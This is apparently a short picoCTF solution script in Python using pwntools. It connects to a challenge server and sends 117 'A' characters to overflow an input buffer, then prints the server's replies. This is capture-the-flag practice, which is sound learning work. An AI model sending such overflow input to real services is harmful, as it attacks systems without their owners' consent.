from pwn import * # pip install pwntools
import json

r = remote('saturn.picoctf.net', 60823, level='debug')

def recv():
    line = r.recv(4096)
    return line.decode('utf-8')

def printer():
    nt="s"
    while(len(nt)):
    	nt = recv()
    	print(nt)
    return

def send(txt):
    request = txt
    r.sendline(request)
    return

aux = recv()

txt = 'A'*117

send(txt)

printer()


